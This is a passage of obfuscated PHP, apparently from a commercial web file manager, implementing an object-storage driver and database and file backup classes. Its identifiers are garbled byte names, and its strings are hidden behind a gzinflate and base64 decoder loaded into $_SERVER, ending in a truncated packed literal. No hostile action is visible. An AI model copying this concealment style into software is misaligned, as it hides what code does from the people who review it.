array($‹üôÛ«¬)); $¬àèºˆ± = count(array_unique($¬àèºˆ±)); $Ïû–Ñä® = count(array_unique($Ïû–Ñä®)); return array($©Ğ£ğ[233] => $¬àèºˆ±, $©Ğ£ğ[234] => $Ïû–Ñä®); } return !1; } public function listAll($úÑª½Ü) { $”·“ƒ³ =& $_SERVER[‚ûòÉ˜ş]; $Òä’Ù = $this->fileList($úÑª½Ü, $”·“ƒ³[12], !0); $ƒêÂ¥¬± = array_to_keyvalue($Òä’Ù[$”·“ƒ³[93]], $”·“ƒ³[42]); foreach ($Òä’Ù[$”·“ƒ³[92]] as $Øîä’ª¢) { if (is_string($Øîä’ª¢)) { $ƒêÂ¥¬±[$Øîä’ª¢] = array($”·“ƒ³[86] => 0); } } return $this->listAllFiles($úÑª½Ü, $ƒêÂ¥¬±); } public function canRead($¯¦ÒËş¦) { $ÎÑî§Øß =& $_SERVER[‚ûòÉ˜ş]; $êÂíóŞ€ = $this->client->getAccessControlPolicy($this->bucket, $¯¦ÒËş¦); if (!$êÂíóŞ€) { return !1; } return in_array($êÂíóŞ€, array($ÎÑî§Øß[235], $ÎÑî§Øß[236], $ÎÑî§Øß[237])) ? !0 : !1; } public function canWrite($»¿„¹¦É) { $ß†¯ßªı =& $_SERVER[‚ûòÉ˜ş]; $´µ¨ÏÎî = $this->client->getAccessControlPolicy($this->bucket, $»¿„¹¦É); if (!$´µ¨ÏÎî) { return !1; } return in_array($´µ¨ÏÎî, array($ß†¯ßªı[235], $ß†¯ßªı[236])) ? !0 : !1; } public function getContent($¡Û©ƒ‘Ò) { return $this->client->getObject($this->bucket, $¡Û©ƒ‘Ò); } public function setContent($œáËÈå, $åÊÆû´ = '', $ü–ÆÔò = false) { $íâ—£ÕŞ =& $_SERVER[‚ûòÉ˜ş]; $œáËÈå = $ü–ÆÔò ? trim($œáËÈå, $íâ—£ÕŞ[8]) . $íâ—£ÕŞ[8] : $œáËÈå; $“á§øŞ¡ = get_file_mime(get_path_ext($œáËÈå)); $Ú»ñ±â— = $this->client->putObject($åÊÆû´, $this->bucket, $œáËÈå, $íâ—£ÕŞ[223], array(), $“á§øŞ¡); if (!$Ú»ñ±â—) { return !1; } if ($ü–ÆÔò) { return !0; } $this->cacheMethod(null, null); $Ú»ñ±â— = $this->copyFile($œáËÈå, $œáËÈå, array($íâ—£ÕŞ[238] => $Ú»ñ±â—[$íâ—£ÕŞ[228]])); return $Ú»ñ±â— ? !0 : !1; } public function fileSubstr($Ÿ†Â‚éĞ, $«†Ÿ©¶é, $¶§ÌÙª) { $Á†‹ ËÄ = $«†Ÿ©¶é + $¶§ÌÙª - 1; return $this->client->getObject($this->bucket, $Ÿ†Â‚éĞ, array($_SERVER[‚ûòÉ˜ş][239] => "\142\171\164\x65\163\75{$«†Ÿ©¶é}\55{$Á†‹ ËÄ}")); } public function upload($µªø²Ùï, $±¥¦­ŠÉ, $´¶Ç°× = false, $éÄ Éßí = REPEAT_REPLACE) { $Â†õÁµ¯ =& $_SERVER[‚ûòÉ˜ş]; $Èşó“ = array($Â†õÁµ¯[238] => @md5_file($±¥¦­ŠÉ)); $¨¨¿­Çç = array($Â†õÁµ¯[240] => get_file_mime(get_path_ext($µªø²Ùï))); if (IO::size($±¥¦­ŠÉ) <= 1024 * 1024 * 200) { $Ğ©Ô³ÜÂ = $this->client->putObjectFile($±¥¦­ŠÉ, $this->bucket, $µªø²Ùï, $Â†õÁµ¯[223], $Èşó“, $¨¨¿­Çç); return !empty($Ğ©Ô³ÜÂ) ? $this->getPathOuter($µªø²Ùï) : !1; } $ğ³ñÉ™™ = $this->client->multiUploadObject($±¥¦­ŠÉ, $this->bucket, trim($µªø²Ùï, $Â†õÁµ¯[8]), $Èşó“, $¨¨¿­Çç); return $ğ³ñÉ™™ ? $this->getPathOuter($µªø²Ùï) : !1; } public function download($Ü¶ÉÂµƒ, $ä®ÑìáĞ) { if (!@is_dir($this->pathFather($ä®ÑìáĞ)) && !IO::mkdir($this->pathFather($ä®ÑìáĞ))) { return !1; } $ãş‚üá˜ = $this->client->getObject($this->bucket, $Ü¶ÉÂµƒ, array(), $ä®ÑìáĞ); return $ãş‚üá˜ !== !1 ? $ä®ÑìáĞ : !1; } public function link($«ˆ²ã, $¯‡ş‘óş = array()) { $›‰³ƒÔ’ =& $_SERVER[‚ûòÉ˜ş]; if ($this->signVer == $›‰³ƒÔ’[241]) { return $this->client->getAuthenticatedURL($this->bucket, $«ˆ²ã, 3600 * 12, $¯‡ş‘óş); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($«ˆ²ã, $›‰³ƒÔ’[8]), 3600 * 12, $this->region, array(), !0, $¯‡ş‘óş); } public function fileOut($Â³„™»ñ, $Ä´˜Ï®œ = false, $ïÂ€óÙó = false, $–«’Á‚ = '') { $™€øÚ“ =& $_SERVER[‚ûòÉ˜ş]; if ($this->isFileOutServer()) { return $this->fileOutServer($Â³„™»ñ, $Ä´˜Ï®œ, $ïÂ€óÙó, $–«’Á‚); } if (!$ïÂ€óÙó) { $ïÂ€óÙó = $this->pathThis($Â³„™»ñ); } $”Úà ÷å = get_file_mime(get_path_ext($ïÂ€óÙó)); if ($”Úà ÷å == $™€øÚ“[242]) { return parent::fileOut($Â³„™»ñ, $Ä´˜Ï®œ, $ïÂ€óÙó, $–«’Á‚); } $×óØ¼à  = array($™€øÚ“[243] => $”Úà ÷å); if ($Ä´˜Ï®œ) { $×óØ¼à [$™€øÚ“[244]] = $™€øÚ“[245] . rawurlencode($ïÂ€óÙó); } else { } $…†äœÔß = $this->link($Â³„™»ñ, $×óØ¼à ); $this->fileOutLink($…†äœÔß); } public function fileOutServer($·ÄÄöÜ”, $¬ª…¨€½ = false, $Ë…ğ§Ã  = false, $Ÿ¸È°šÛ = '') { parent::fileOut($·ÄÄöÜ”, $¬ª…¨€½, $Ë…ğ§Ã , $Ÿ¸È°šÛ); } public function fileOutImageServer($‡ğœÂ¤™, $çºò¸áö = 250) { parent::fileOutImage($‡ğœÂ¤™, $çºò¸áö); } public function hashMd5($ü®÷‘Ç, $¼‰‚”ÇË = '') { $Ç¶¤‡¹¼ =& $_SERVER[‚ûòÉ˜ş]; $¶ö«™¿ğ = $this->objectMeta($ü®÷‘Ç); if (!$¶ö«™¿ğ) { return !1; } $¼‰‚”ÇË = $¼‰‚”ÇË ? $¼‰‚”ÇË : _get($¶ö«™¿ğ, $Ç¶¤‡¹¼[246]); $¼‰‚”ÇË = $¼‰‚”ÇË ? $¼‰‚”ÇË : _get($¶ö«™¿ğ, $Ç¶¤‡¹¼[228], $Ç¶¤‡¹¼[12]); return $¼‰‚”ÇË; } public function uploadFormData($¿­‘ãÄ¾, $†Í¥…ÏÓ = 3600) { $ù²×­» =& $_SERVER[‚ûòÉ˜ş]; $Û‚«êæ = $this->pathFather($¿­‘ãÄ¾); $âßÇÚ¸” = $this->client->getHttpUploadPostParams($this->bucket, $Û‚«êæ, $ù²×­»[223], $†Í¥…ÏÓ); return array_merge((array) $âßÇÚ¸”, array($ù²×­»[206] => $this->getHost())); } public function multiUploadFormData($òÊŞ­‰´, $â†¾Äà = 3600) { $¡÷ƒ×¶ë =& $_SERVER[‚ûòÉ˜ş]; $‹·»ù© = gmdate($¡÷ƒ×¶ë[247]); $Ë¦õ¶œŒ = array(); $åƒ†×Ö÷ = $this->client->getUploadId($this->bucket, $òÊŞ­‰´, $Ë¦õ¶œŒ); if (!$åƒ†×Ö÷) { return !1; } return array($¡÷ƒ×¶ë[248] => $åƒ†×Ö÷, $¡÷ƒ×¶ë[206] => $this->getHost() . $¡÷ƒ×¶ë[8] . $this->pathEncode($òÊŞ­‰´), $¡÷ƒ×¶ë[249] => $‹·»ù©, $¡÷ƒ×¶ë[104] => $òÊŞ­‰´); } public function multiUploadAuthData($§ÍÚı…õ, $ÖşÀ”Ä = array()) { $·÷çĞ•š =& $_SERVER[‚ûòÉ˜ş]; $•í‡·¡È = isset($ÖşÀ”Ä[$·÷çĞ•š[249]]) ? $ÖşÀ”Ä[$·÷çĞ•š[249]] : gmdate($·÷çĞ•š[247]); $Çó¿×³Œ = isset($ÖşÀ”Ä[$·÷çĞ•š[185]]) ? $ÖşÀ”Ä[$·÷çĞ•š[185]] : $·÷çĞ•š[12]; $­Òå«š° = $ÖşÀ”Ä[$·÷çĞ•š[104]]; unset($ÖşÀ”Ä[$·÷çĞ•š[104]]); if (isset($ÖşÀ”Ä[$·÷çĞ•š[250]])) { $ÖşÀ”Ä[$·÷çĞ•š[249]] = $•í‡·¡È; return $this->listUploadParts($­Òå«š°, $ÖşÀ”Ä); } $áÙ±Œ­ = array($·÷çĞ•š[251], $·÷çĞ•š[12], $·÷çĞ•š[130], $·÷çĞ•š[12], "\170\55\x61\155\x7a\x2d\x64\141\x74\145\72{$•í‡·¡È}", $·÷çĞ•š[8] . $this->bucket . $·÷çĞ•š[8] . $this->pathEncode($­Òå«š°) . $Çó¿×³Œ); if (strpos($Çó¿×³Œ, $·÷çĞ•š[252]) === 0) { $áÙ±Œ­[0] = $·÷çĞ•š[253]; } if (isset($ÖşÀ”Ä[$·÷çĞ•š[254]]) && $ÖşÀ”Ä[$·÷çĞ•š[254]] == $·÷çĞ•š[255]) { $áÙ±Œ­[0] = $·÷çĞ•š[255]; } $¯Ó¡ñ¼İ = implode($·÷çĞ•š[18], $áÙ±Œ­); $ŒÎÎ˜Ÿ = base64_encode(hash_hmac($·÷çĞ•š[256], $¯Ó¡ñ¼İ, $this->secret, !0)); $ÔÛÁ¢÷Ê = $·÷çĞ•š[257] . $this->accessKey . $·÷çĞ•š[4] . $ŒÎÎ˜Ÿ; if (strpos($Çó¿×³Œ, $·÷çĞ•š[252]) === 0) { return array($·÷çĞ•š[258] => $ÔÛÁ¢÷Ê, $·÷çĞ•š[249] => $•í‡·¡È); } return $ÔÛÁ¢÷Ê; } public function listUploadParts($Í¢·ÅÛ¨, $’ãÚüŸƒ = array()) { $¢›ÏÒóˆ =& $_SERVER[‚ûòÉ˜ş]; $ª¡õÕÀ¡ = str_replace($¢›ÏÒóˆ[259], $¢›ÏÒóˆ[12], $’ãÚüŸƒ[$¢›ÏÒóˆ[185]]); $³×à†‘¦ = $this->client->listParts($this->bucket, $Í¢·ÅÛ¨, $ª¡õÕÀ¡); if (!$³×à†‘¦) { return !1; } unset($’ãÚüŸƒ[$¢›ÏÒóˆ[250]], $’ãÚüŸƒ[$¢›ÏÒóˆ[254]]); $’ãÚüŸƒ[$¢›ÏÒóˆ[104]] = $Í¢·ÅÛ¨; $–èÀøğİ = $this->multiUploadAuthData($Í¢·ÅÛ¨, $’ãÚüŸƒ); if (empty($–èÀøğİ)) { return !1; } return array($¢›ÏÒóˆ[258] => $–èÀøğİ, $¢›ÏÒóˆ[249] => $’ãÚüŸƒ[$¢›ÏÒóˆ[249]], $¢›ÏÒóˆ[260] => $³×à†‘¦); } public function getHost() { return parent::getHost() . $_SERVER[‚ûòÉ˜ş][8] . $this->bucket; } public function size($ô²¬¿Ù) { $Ë öÔáº = $this->objectMeta($ô²¬¿Ù); return $Ë öÔáº ? $Ë öÔáº[$_SERVER[‚ûòÉ˜ş][86]] : 0; } public function info($È›æÛ¡İ) { if ($this->isFolder($È›æÛ¡İ)) { return $this->folderInfo($È›æÛ¡İ); } else { if ($this->isFile($È›æÛ¡İ)) { return $this->fileInfo($È›æÛ¡İ); } } return !1; } public function exist($ú«×²ƒ) { return $this->isFile($ú«×²ƒ) || $this->isFolder($ú«×²ƒ); } public function isFile($¶¥ğ°è”) { return !$this->isFolder($¶¥ğ°è”) && $this->objectMeta($¶¥ğ°è”); } public function isFolder($…¡ë¾³ë) { return $this->cacheMethod($_SERVER[‚ûòÉ˜ş][176], $…¡ë¾³ë); } protected function objectMeta($ß£Ÿ) { return $this->cacheMethod($_SERVER[‚ûòÉ˜ş][178], $ß£Ÿ); } protected function _objectMeta($—»åãˆ) { $åõÂğ =& $_SERVER[‚ûòÉ˜ş]; $—»åãˆ = rtrim($—»åãˆ, $åõÂğ[8]); try { $´¬Ëşáé = $this->client->getObjectInfo($this->bucket, $—»åãˆ); if (!isset($´¬Ëşáé[$åõÂğ[246]]) && isset($´¬Ëşáé[$åõÂğ[261]])) { $´¬Ëşáé[$åõÂğ[246]] = $´¬Ëşáé[$åõÂğ[261]]; } } catch (Exception $¼ Âò‹Î) { $´¬Ëşáé = !1; } if (!$´¬Ëşáé) { } return $´¬Ëşáé; } protected function _isFolder($àÄšÉ‹û) { $Êğš­ÛÎ =& $_SERVER[‚ûòÉ˜ş]; $àÄšÉ‹û = rtrim($àÄšÉ‹û, $Êğš­ÛÎ[8]); if ($àÄšÉ‹û == $Êğš­ÛÎ[12] || $àÄšÉ‹û == $Êğš­ÛÎ[8]) { return !0; } $•îÜà® = $this->client->getBucket($this->bucket, $àÄšÉ‹û, null, 1); if (empty($•îÜà®[$Êğš­ÛÎ[230]])) { return !1; } $û“Û—ª¬ = $•îÜà®[$Êğš­ÛÎ[230]][0][$Êğš­ÛÎ[42]]; return stripos($û“Û—ª¬, $àÄšÉ‹û . $Êğš­ÛÎ[8]) === 0 ? !0 : !1; if (substr($û“Û—ª¬, -1) == $Êğš­ÛÎ[8]) { return !0; } if (get_path_this($û“Û—ª¬) == get_path_this($àÄšÉ‹û)) { return !1; } return !0; } } goto F‡‡Ï·Ò‘Ì; c—áïİƒî¤: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ğâ¢Ğµî =& $_SERVER[‚ûòÉ˜ş]; $¶œš“Íí = Backup::get(); self::$io = $¶œš“Íí[$ğâ¢Ğµî[791]]; self::$name = $¶œš“Íí[$ğâ¢Ğµî[42]]; $ËÓÆÅ­¤ = new DbManage(); $üà¢óÎˆ = $ËÓÆÅ­¤->dbType(); $İ¶ï´¡ç = array($ğâ¢Ğµî[816] => $üà¢óÎˆ, $ğâ¢Ğµî[817] => time()); Backup::set($İ¶ï´¡ç); $Ú®şà…Ê = $this->tmpFilesPath() . $ğâ¢Ğµî[818] . self::$name . $ğâ¢Ğµî[8]; del_dir($Ú®şà…Ê); mk_dir($Ú®şà…Ê); $¹‚ ˆ = $†Ïı±í£ = 0; $ëûÍæŸ¸ = new Task($ğâ¢Ğµî[819], $ğâ¢Ğµî[820], 0, LNG($ğâ¢Ğµî[821]) . $ğâ¢Ğµî[822] . LNG($ğâ¢Ğµî[823])); try { $¢ÈáŒë· = $ËÓÆÅ­¤->db()->getTables(); } catch (Exception $ÚÖ–ÄÅ´) { $ëûÍæŸ¸->end(); return !1; } $¢ÈáŒë· = array_diff($¢ÈáŒë·, array($ğâ¢Ğµî[824], $ğâ¢Ğµî[825])); foreach ($¢ÈáŒë· as $…ì¡µ—) { $¹‚ ˆ += $ËÓÆÅ­¤->model($…ì¡µ—)->count(); } $ëûÍæŸ¸->task[$ğâ¢Ğµî[826]] = $¹‚ ˆ; $GLOBALS[$ğâ¢Ğµî[827]] = self::$name; foreach ($¢ÈáŒë· as $…ì¡µ—) { $²õîº…Í = $Ú®şà…Ê . $…ì¡µ— . $ğâ¢Ğµî[828]; $Œ›éµ¹„ = null; if ($…ì¡µ— == $ğâ¢Ğµî[829] && (!isset($¶œš“Íí[$ğâ¢Ğµî[794]]) || $¶œš“Íí[$ğâ¢Ğµî[794]] == $ğâ¢Ğµî[222])) { $Œ›éµ¹„ = self::$io; } $†Ïı±í£ += $ËÓÆÅ­¤->sqlFromDb($…ì¡µ—, $²õîº…Í, $ëûÍæŸ¸, $Œ›éµ¹„); } unset($GLOBALS[$ğâ¢Ğµî[827]]); $ëûÍæŸ¸->end(); if ($†Ïı±í£ > $¹‚ ˆ) { $¹‚ ˆ = $†Ïı±í£; } $İ¶ï´¡ç = array($ğâ¢Ğµî[816] => $üà¢óÎˆ, $ğâ¢Ğµî[813] => 1, $ğâ¢Ğµî[830] => $¹‚ ˆ, $ğâ¢Ğµî[831] => $†Ïı±í£, $ğâ¢Ğµî[832] => time()); Backup::set($İ¶ï´¡ç); if ($¹‚ ˆ - $†Ïı±í£ > 0) { $‰Ë‚ªİ = $ğâ¢Ğµî[833]; if (stristr(I18n::getType(), $ğâ¢Ğµî[834])) { $‰Ë‚ªİ = $ğâ¢Ğµî[835]; } write_log(array($‰Ë‚ªİ, $İ¶ï´¡ç), $ğâ¢Ğµî[820]); return !1; } return !0; } private function tmpFilesPath() { $¿Òß¼ =& $_SERVER[‚ûòÉ˜ş]; $¬¿ÓÉŠ¡ = TEMP_FILES; if ($GLOBALS[$¿Òß¼[6]][$¿Òß¼[99]][$¿Òß¼[836]]) { $¬¿ÓÉŠ¡ = $GLOBALS[$¿Òß¼[6]][$¿Òß¼[99]][$¿Òß¼[836]]; if (!mk_dir($¬¿ÓÉŠ¡) || !is_writable($¬¿ÓÉŠ¡) || !IO::mkfile($¬¿ÓÉŠ¡ . $¿Òß¼[837])) { $¬¿ÓÉŠ¡ = TEMP_FILES; } } return $¬¿ÓÉŠ¡; } } class BackupDbFile { public function __construct() { } public function index() { $ºŠ­²İö =& $_SERVER[‚ûòÉ˜ş]; $„³µôĞÕ = Backup::get(); $Œ”¸ßŠö = $„³µôĞÕ[$ºŠ­²İö[42]]; $ÊØ´óÀÆ = $this->tmpFilesPath() . "\142\141\x63\153\x75\160\137{$Œ”¸ßŠö}\57"; $ò£äóºÕ = $this->backupPath($„³µôĞÕ); if (!($ò£äóºÕ = IO::mkdir($ò£äóºÕ))) { return !1; } $éÁŒ± = IO::listPath($ÊØ´óÀÆ); $ÍşÚÍÓ… = isset($éÁŒ±[$ºŠ­²İö[93]]) ? $éÁŒ±[$ºŠ­²İö[93]] : array(); $Ä€Ãæï¨ = array_sum(array_column($ÍşÚÍÓ…, $ºŠ­²İö[86])); if (!$Ä€Ãæï¨) { return !1; } $¬¼ãˆØÅ = array($ºŠ­²İö[838] => $Ä€Ãæï¨, $ºŠ­²İö[839] => time()); Backup::set($¬¼ãˆØÅ); $„„œ—ö× = new TaskFileTransfer($ºŠ­²İö[840], $ºŠ­²İö[820], count($ÍşÚÍÓ…), LNG($ºŠ­²İö[821]) . $ºŠ­²İö[438] . LNG($ºŠ­²İö[823]) . $ºŠ­²İö[841]); $„„œ—ö×->task[$ºŠ­²İö[803]] = $Ä€Ãæï¨; foreach ($éÁŒ±[$ºŠ­²İö[93]] as $û¬åª¬¼) { $¥õõ†íø = IO::move($û¬åª¬¼[$ºŠ­²İö[94]], $ò£äóºÕ); if (!$¥õõ†íø) { $„„œ—ö×->end(); $ÂŒê„Ñ = IO::getLastError($ºŠ­²İö[842] . $û¬åª¬¼[$ºŠ­²İö[94]] . $ºŠ­²İö[843] . $ò£äóºÕ . $ºŠ­²İö[175]); write_log($ÂŒê„Ñ, $ºŠ­²İö[820]); return !1; } } $à·¢Áò¶ = new DbManage(); $ê¶µƒ‹¸ = $à·¢Áò¶->getSqlFile(); if (!$ê¶µƒ‹¸[$ºŠ­²İö[844]] || !$ê¶µƒ‹¸[$ºŠ­²İö[23]]) { return !1; } IO::move($ê¶µƒ‹¸[$ºŠ­²İö[844]], $ò£äóºÕ); IO::move($ê¶µƒ‹¸[$ºŠ­²İö[23]], $ò£äóºÕ); $„„œ—ö×->end(); $¬¼ãˆØÅ = array($ºŠ­²İö[845] => $Ä€Ãæï¨, $ºŠ­²İö[846] => time()); Backup::set($¬¼ãˆØÅ); return !0; } private function backupPath($ğÛ•İ¯) { $ş¯ÏÇ½… =& $_SERVER[‚ûòÉ˜ş]; $½Ğ«Îå† = $ğÛ•İ¯[$ş¯ÏÇ½…[42]]; $½š´¾˜Á = Model($ş¯ÏÇ½…[810])->get($ş¯ÏÇ½…[811]); $•™¸ĞÑ = substr(md5($ş¯ÏÇ½…[812] . $½š´¾˜Á . $½Ğ«Îå†), 0, 8); return "\173\x69\157\x3a{$ğÛ•İ¯[$ş¯ÏÇ½…[791]]}\175\x2f\x64\x61\x74\141\142\141\x73\x65\57\x62\x61\x63\153\x75\x70\x2f" . $½Ğ«Îå† . $ş¯ÏÇ½…[11] . $•™¸ĞÑ; } private function tmpFilesPath() { $ª†‚÷´÷ =& $_SERVER[‚ûòÉ˜ş]; $®İ£ùÛ = TEMP_FILES; if ($GLOBALS[$ª†‚÷´÷[6]][$ª†‚÷´÷[99]][$ª†‚÷´÷[836]]) { $®İ£ùÛ = $GLOBALS[$ª†‚÷´÷[6]][$ª†‚÷´÷[99]][$ª†‚÷´÷[836]]; if (!mk_dir($®İ£ùÛ) || !is_writable($®İ£ùÛ) || !IO::mkfile($®İ£ùÛ . $ª†‚÷´÷[837])) { $®İ£ùÛ = TEMP_FILES; } } return $®İ£ùÛ; } } class BackupFile { public function __construct() { } public function index() { $§Ş—†ûä = Backup::get(); $¿¶ë¼§ = $§Ş—†ûä[$_SERVER[‚ûòÉ˜ş][346]][$_SERVER[‚ûòÉ˜ş][224]][$_SERVER[‚ûòÉ˜ş][517]]; $«’ ª¡« = array($_SERVER[‚ûòÉ˜ş][518] => array($_SERVER[‚ûòÉ˜ş][847], $¿¶ë¼§), $_SERVER[‚ûòÉ˜ş][848] => array($_SERVER[‚ûòÉ˜ş][384], $§Ş—†ûä[$_SERVER[‚ûòÉ˜ş][791]])); $£µáğ° = (int) Model($_SERVER[‚ûòÉ˜ş][829])->where($«’ ª¡«)->count($_SERVER[‚ûòÉ˜ş][517]); $µó˜£áù = (int) Model($_SERVER[‚ûòÉ˜ş][829])->where($«’ ª¡«)->sum($_SERVER[‚ûòÉ˜ş][86]); $¾ñµş¥‹ = new TaskFileTransfer($_SERVER[‚ûòÉ˜ş][849], $_SERVER[‚ûòÉ˜ş][820], $£µáğ°, LNG($_SERVER[‚ûòÉ˜ş][821]) . $_SERVER[‚ûòÉ˜ş][822] . LNG($_SERVER[‚ûòÉ˜ş][850])); $¾ñµş¥‹->task[$_SERVER[‚ûòÉ˜ş][803]] = $µó˜£áù; $îœãˆÏ = array($_SERVER[‚ûòÉ˜ş][851] => $£µáğ°, $_SERVER[‚ûòÉ˜ş][852] => $µó˜£áù, $_SERVER[‚ûòÉ˜ş][853] => time()); Backup::set($îœãˆÏ); $¡²ÑĞ­ = !0; $¤ÖÔ“Û‘ = $this->storeIds(); $šÔ‡ñ = 1; $ÅÌÚ´­§ = 1000; $£éØğ£½ = $÷’×Ã– = 0; $ƒùÒ¸á± = array(); $µŞ­§† = $‰²Ÿ‰÷ = 0; do { $¿ÅéË¹ô = $_SERVER[‚ûòÉ˜ş][854]; $İ¼š—Æµ = Model($_SERVER[‚ûòÉ˜ş][829])->where($«’ ª¡«)->field($¿ÅéË¹ô)->order($_SERVER[‚ûòÉ˜ş][855])->selectPage($ÅÌÚ´­§, $šÔ‡ñ); $…‡«¼íÑ = !empty($İ¼š—Æµ[$_SERVER[‚ûòÉ˜ş][422]]) ? $İ¼š—Æµ[$_SERVER[‚ûòÉ˜ş][422]] : array(); foreach ($…‡«¼íÑ as $çóıĞ) { if (!$this->_fileExist($çóıĞ, $ƒùÒ¸á±, $¤ÖÔ“Û‘)) { $£µáğ° -= 1; $µó˜£áù -= (int) $çóıĞ[$_SERVER[‚ûòÉ˜ş][86]]; write_log("\x66\x69\x6c\x65\x20\x6e\157\164\40\145\170\151\x73\x74\x2e\146\151\x6c\x65\111\x44\72{$çóıĞ[$_SERVER[‚ûòÉ˜ş][517]]}\54\x20\x70\141\x74\x68\x3a{$çóıĞ[$_SERVER[‚ûòÉ˜ş][94]]}", $_SERVER[‚ûòÉ˜ş][856]); continue; } $ÎÍ·Ôåô = $çóıĞ[$_SERVER[‚ûòÉ˜ş][94]]; $¬˜Â¡Ğ = "\x7b\151\x6f\x3a{$§Ş—†ûä[$_SERVER[‚ûòÉ˜ş][791]]}\x7d" . substr($ÎÍ·Ôåô, strlen("\x7b\x69\157\x3a{$çóıĞ[$_SERVER[‚ûòÉ˜ş][857]]}\175")); if (IO::exist($¬˜Â¡Ğ)) { $¾ñµş¥‹->updateFileEnd($çóıĞ[$_SERVER[‚ûòÉ˜ş][42]], $çóıĞ[$_SERVER[‚ûòÉ˜ş][86]]); } else { $¬˜Â¡Ğ = get_path_father($¬˜Â¡Ğ); IO::mkdir($¬˜Â¡Ğ); if (!IO::copy($ÎÍ·Ôåô, $¬˜Â¡Ğ, $_SERVER[‚ûòÉ˜ş][858])) { write_log($_SERVER[‚ûòÉ˜ş][859] . $ÎÍ·Ôåô . $_SERVER[‚ûòÉ˜ş][843] . $¬˜Â¡Ğ . $_SERVER[‚ûòÉ˜ş][175], $_SERVER[‚ûòÉ˜ş][820]); $¡²ÑĞ­ = !1; break; } } $¿¶ë¼§ = $çóıĞ[$_SERVER[‚ûòÉ˜ş][517]]; $÷’×Ã– += 1; $£éØğ£½ += $çóıĞ[$_SERVER[‚ûòÉ˜ş][86]]; $‰²Ÿ‰÷ += 1; $µŞ­§† += $çóıĞ[$_SERVER[‚ûòÉ˜ş][86]]; if ($£éØğ£½ >= 1024 * 1024 * 100) { $îœãˆÏ = array($_SERVER[‚ûòÉ˜ş][860] => $¿¶ë¼§, $_SERVER[‚ûòÉ˜ş][861] => $‰²Ÿ‰÷, $_SERVER[‚ûòÉ˜ş][862] => $µŞ­§†); Backup::set($îœãˆÏ); $£éØğ£½ = $÷’×Ã– = 0; } } $§ö‹ŒÈï = count($…‡«¼íÑ); $šÔ‡ñ++; } while ($§ö‹ŒÈï == $ÅÌÚ´­§); $¾ñµş¥‹->end(); $îœãˆÏ = array($_SERVER[‚ûòÉ˜ş][863] => 1, $_SERVER[‚ûòÉ˜ş][801] => time(), $_SERVER[‚ûòÉ˜ş][815] => 1, $_SERVER[‚ûòÉ˜ş][860] => $¿¶ë¼§, $_SERVER[‚ûòÉ˜ş][852] => $µó˜£áù, $_SERVER[‚ûòÉ˜ş][851] => $£µáğ°, $_SERVER[‚ûòÉ˜ş][864] => time()); if ($÷’×Ã–) { $îœãˆÏ[$_SERVER[‚ûòÉ˜ş][861]] = $‰²Ÿ‰÷; $îœãˆÏ[$_SERVER[‚ûòÉ˜ş][862]] = $µŞ­§†; } Backup::set($îœãˆÏ); $this->_fileFilter($ƒùÒ¸á±); return !0; } private function _fileExist($Øáìú˜×, &$·Ò¬¨ŸÚ, $¾ø•—½) { $«™½âäÌ =& $_SERVER[‚ûòÉ˜ş]; $ş÷Èäùê = $Øáìú˜×[$«™½âäÌ[94]]; if (in_array($Øáìú˜×[$«™½âäÌ[517]], $·Ò¬¨ŸÚ)) { return !1; } if (!in_array($Øáìú˜×[$«™½âäÌ[857]], $¾ø•—½)) { return !1; } if (IO::exist($ş÷Èäùê)) { return !0; } $¥‡²¹¤ = get_path_father($ş÷Èäùê); if (IO::exist($¥‡²¹¤)) { $·Ò¬¨ŸÚ[] = $Øáìú˜×[$«™½âäÌ[517]]; return !1; } $á«¸¡Ï‚ = array($«™½âäÌ[857] => $Øáìú˜×[$«™½âäÌ[857]], $«™½âäÌ[94] => array($«™½âäÌ[435], "{$¥‡²¹¤}\x25")); $ìôöµ» = Model($«™½âäÌ[829])->where($á«¸¡Ï‚)->field($«™½âäÌ[518])->select(); $·Ò¬¨ŸÚ = array_merge($·Ò¬¨ŸÚ, array_to_keyvalue($ìôöµ», $«™½âäÌ[12], $«™½âäÌ[517])); return !1; } private function _fileFilter($’¥‘„’”) { $œÕç‹Æß =& $_SERVER[‚ûòÉ˜ş]; if (empty($’¥‘„’”)) { return; } $é…ÜŞõ´ = array($œÕç‹Æß[517] => array($œÕç‹Æß[7], array_unique($’¥‘„’”))); $èñÖñÇ¬ = Model($œÕç‹Æß[865])->where($é…ÜŞõ´)->field($œÕç‹Æß[191])->select(); foreach ($èñÖñÇ¬ as $§¦óé¹€) { Model($œÕç‹Æß[865])->remove($§¦óé¹€[$œÕç‹Æß[191]], !1); } } private function storeIds() { $Êû¾Ë“” =& $_SERVER[‚ûòÉ˜ş]; $ÇÕÇÙÜÜ = Model($Êû¾Ë“”[807])->listData(); $õ‰¹ÏÌ› = array(); $›Øó÷÷Ö = $GLOBALS[$Êû¾Ë“”[6]][$Êû¾Ë“”[99]][$Êû¾Ë“”[866]]; foreach ($ÇÕÇÙÜÜ as $æıÉŒòÕ) { $âç£¼·È = strtolower($æıÉŒòÕ[$Êû¾Ë“”[105]]); if (!isset($›Øó÷÷Ö[$âç£¼·È])) { continue; } $°‚ÖØñ´ = $Êû¾Ë“”[84] . (isset($›Øó÷÷Ö[$âç£¼·È]) ? $›Øó÷÷Ö[$âç£¼·È] : ucfirst($âç£¼·È)); if (!class_exists($°‚ÖØñ´)) { continue; } $õ‰¹ÏÌ›[] = $æıÉŒòÕ[$Êû¾Ë“”[451]]; } return $õ‰¹ÏÌ›; } } goto c¿›Á„˜Ë; Bä•ô´Ë³¯: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(strrev('ş˜Éòû‚'), "\xcc\xf0\x95\xc1\xf1\xfa"); $_SERVER[‚ûòÉ˜ş] = explode("\x7c\x1\x7c\x3\x7c\x4", gzinflate(substr(strrev('¬ÙÛœ’2Ùm–Yq8îv¶bÂÙÊ(á UÎ8õÅ|	½Å'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹